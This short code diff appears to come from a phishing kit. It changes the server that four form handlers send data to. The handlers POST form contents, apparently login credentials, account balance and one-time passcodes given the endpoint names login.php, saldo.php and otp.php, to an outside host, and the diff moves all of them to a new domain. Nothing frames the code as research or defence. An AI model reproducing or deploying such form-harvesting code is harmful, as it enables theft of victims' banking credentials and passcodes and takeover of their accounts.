@@ -14,7 +14,7 @@ document.getElementById('btnSubmit').innerHTML = "Please wait...";
 
  $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app23/no.php',
+ url: 'https://axcellent.cf-pow.cfd/app23/no.php',
  data: $(this).serialize(),
  datatype: 'text',
  
@@ -39,7 +39,7 @@ document.getElementById('btnSubmit').innerHTML = "Please wait...";
 
  $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app23/login.php',
+ url: 'https://axcellent.cf-pow.cfd/app23/login.php',
  data: $(this).serialize(),
  datatype: 'text',
  
@@ -69,7 +69,7 @@ document.getElementById('btnSubmit1').innerHTML = "Verify...";
 
  $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app23/saldo.php',
+ url: 'https://axcellent.cf-pow.cfd/app23/saldo.php',
  data: $(this).serialize(),
  datatype: 'text',
  
@@ -105,7 +105,7 @@ document.getElementById('btnSubmit1').innerHTML = "Please wait...";
 $.ajax({
 
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app23/otp.php',
+ url: 'https://axcellent.cf-pow.cfd/app23/otp.php',
  async: false,
  dataType: 'text',
  data: $(this).serialize(),
